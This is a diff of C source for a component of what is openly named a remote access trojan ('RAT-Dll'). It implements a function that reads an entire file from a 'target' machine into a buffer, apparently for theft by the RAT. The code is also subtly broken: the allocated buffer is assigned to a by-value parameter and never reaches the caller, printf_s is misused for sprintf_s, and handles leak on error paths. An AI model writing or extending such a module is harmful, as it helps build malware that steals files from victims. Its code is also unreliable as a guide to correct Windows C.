@@ -6,14 +6,20 @@
 #include "RAT-Dll-Connect.h"
 
 
+/** This function will perform a simple get file for us 
+params:
+* filePath - path to the file we're getting
+* fileBytes - buffer containing file bytes we got from our target file 
+return:
+* if successful we return SUCCESS; otherwise print error code and handle appropiately 
+*/
 INT performGetFile(__in const char* filePath, __out char* fileBytes)
 {
 	INT status = SUCCESS;
 	HANDLE hFile;
 	DWORD dwBytesRead = 0;
 	CHAR msgBuf[DEFAULT_BUF_LEN];
-	BY_HANDLE_FILE_INFORMATION lpFileInformation;
-
+	LARGE_INTEGER fileSize; 
 
 	hFile = CreateFileA(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
@@ -24,30 +30,40 @@ INT performGetFile(__in const char* filePath, __out char* fileBytes)
 	}
 
 	// Get file details first prior to reading it so we can get the whole size of the file 
-	if (GetFileInformationByHandle(hFile, &lpFileInformation))
+	if (!GetFileSizeEx(hFile, &fileSize))
 	{
-
-		// Now note the size and read the file 
-
-		// status = ReadFile();
-
-		// allocate for fileBytes as needed according to file size 
-
-
-	}
-	// Failed to get file info 
-	else
-	{
-		sprintf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from GetFileInformationByHandle %d\n", GetLastError());
+		sprintf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from GetFileSizeEx %d\n", GetLastError());
 		OutputDebugStringA(msgBuf);
 		status = GetLastError();
 		goto cleanup;
 	}
 
+	// Allocate for our file buffer
+	fileBytes = (char*)malloc(fileSize.QuadPart * sizeof(char));
+	if (fileBytes == NULL)
+	{
+		OutputDebugStringA("RAT-Dll-GetFile::performGetFile - Failure from malloc (NOT ENOUGH MEMORY)");
+		status = FAILURE;
+		goto cleanup;
+	}
 
+	// Now note the size and read the file 
+	if (!ReadFile(hFile, fileBytes, fileSize.QuadPart, &dwBytesRead, NULL))
+	{
+		sprintf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from ReadFile %d\n", GetLastError());
+		OutputDebugStringA(msgBuf);
+		status = GetLastError();
+		goto cleanup;
+	}
 
-	// will get filesize and allocate this buffer ourselves 
-	// hFile = CreateFileA();
+	// Normal Windows app will close the handle to the file
+	if (!CloseHandle(hFile))
+	{
+		printf_s(msgBuf, "RAT-Dll-GetFile::performGetFile - Failure from CloseHandle %d\n", GetLastError());
+		OutputDebugStringA(msgBuf);
+		status = GetLastError();
+		goto cleanup;
+	}
 
 cleanup:
 	return status;
